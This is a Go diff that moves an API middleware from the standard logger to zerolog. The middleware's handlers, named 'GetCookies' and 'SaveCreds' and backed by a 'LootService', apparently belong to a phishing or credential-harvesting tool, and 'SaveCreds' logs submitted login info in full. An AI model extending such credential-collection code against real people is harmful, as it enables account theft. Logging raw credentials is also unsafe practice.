@@ -1,7 +1,6 @@
 package main
 
 import (
-	"log"
 	"net/http"
 	"net/url"
 	"strings"
@@ -9,6 +8,7 @@ import (
 	"github.com/gofiber/fiber/v2"
 	"github.com/gofiber/fiber/v2/middleware/cors"
 	"github.com/gofiber/fiber/v2/utils"
+	"github.com/rs/zerolog"
 	"github.com/valyala/fasthttp"
 	"go.uber.org/multierr"
 )
@@ -30,8 +30,8 @@ type APIConfig struct {
 	CookieSaver CookieSaver
 }
 
-func NewAPIMiddleware(conf APIConfig) fiber.Handler {
-	m := &apiMiddleware{&conf}
+func NewAPIMiddleware(log *zerolog.Logger, conf APIConfig) fiber.Handler {
+	m := &apiMiddleware{APIConfig: &conf, log: log}
 	api := fiber.New()
 	api.Use(cors.New(cors.Config{
 		AllowCredentials: true,
@@ -78,6 +78,7 @@ func NewAPIMiddleware(conf APIConfig) fiber.Handler {
 
 type apiMiddleware struct {
 	*APIConfig
+	log *zerolog.Logger
 }
 
 func (m *apiMiddleware) GetCookies(c *fiber.Ctx) error {
@@ -145,6 +146,6 @@ func (m *apiMiddleware) SaveCreds(c *fiber.Ctx) (err error) {
 	if err = c.BodyParser(&info); err != nil {
 		return
 	}
-	log.Println("loginInfo = ", info)
+	m.log.Info().Any("loginInfo", &info).Msg("save creds")
 	return m.LootService.SaveCreds(c, &info)
 }
